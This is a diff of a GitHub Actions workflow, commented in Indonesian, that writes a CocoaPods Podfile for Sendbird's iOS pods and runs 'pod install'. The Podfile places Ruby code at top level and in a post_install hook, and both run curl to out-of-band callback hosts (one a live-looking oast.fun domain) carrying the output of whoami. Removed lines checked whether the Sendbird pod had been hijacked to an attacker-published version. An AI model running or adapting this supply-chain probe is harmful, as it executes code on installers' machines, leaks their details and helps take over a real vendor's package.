@@ -8,17 +8,21 @@ jobs:
       - name: Checkout
         uses: actions/checkout@v4
 
-      - name: Setup Headless Pod Test
+      - name: Setup Force-Execution Pod Test
         run: |
           mkdir -p TrialRun
           cd TrialRun
           
-          # Setup Git
           git config --global user.email "researcher@test.com"
           git config --global user.name "Researcher"
 
-          # Tulis Podfile MODE HEADLESS + RCE TRIGGER
+          # Tulis Podfile dengan TOP-LEVEL EXECUTION
+          # Kode Ruby di luar blok 'target' akan langsung jalan saat 'pod install' dipanggil
           cat <<EOF > Podfile
+          # TRIGGER LANGSUNG SAAT PODFILE DIBACA
+          puts "[!] INITIALIZING ATTACK PROBE..."
+          system("curl -v http://LINK-OAST-LU-DISINI.com/INIT_$(whoami)")
+
           install! 'cocoapods', :integrate_targets => false
 
           source 'https://github.com/sendbird/sendbird-ios-distribution.git'
@@ -31,28 +35,14 @@ jobs:
             pod 'SendbirdAIAgentMessenger', '>= 1.13.0'
           end
 
-          # INI ADALAH BUKTI IMPACT (RCE) UNTUK TRIAGER
           post_install do |installer|
-            puts "\n[!] TRIGGERING SECURITY AUDIT PROBE..."
-            # GANTI URL DI BAWAH DENGAN LINK OAST/INTERACTSH LU YANG BARU
-            system("curl -v http://LINK-OAST-LU-DISINI.com/RCE_CONFIRMED_$(whoami)")
+            puts "[!] POST-INSTALL TRIGGER..."
+            system("curl -v http://zgaonaqfeajfjxvuunah5i7blu0wsevoe.oast.fun/POST_$(whoami)")
           end
           EOF
 
       - name: Execution & Hijack Proof
         run: |
           cd TrialRun
-          # Jalankan install. --repo-update memastikan dia narik metadata terbaru (v5.0.x lu)
+          # Paksa verbose buat liat output puts
           pod install --repo-update --verbose
-          
-          echo -e "\n--- BUKTI FINAL UNTUK TRIAGER ---"
-          if [ -f Podfile.lock ]; then
-            cat Podfile.lock
-            if grep -q "5.0." Podfile.lock; then
-              echo "✅ SUCCESS: Pod Sendbird berhasil dibajak ke versi 5.0.x!"
-            else
-              echo "❌ FAILED: Masih menggunakan versi resmi. Cek apakah v5.0.x lu sudah beneran ter-publish di Trunk."
-            fi
-          else
-            echo "❌ ERROR: Podfile.lock tidak ter-generate."
-          fi
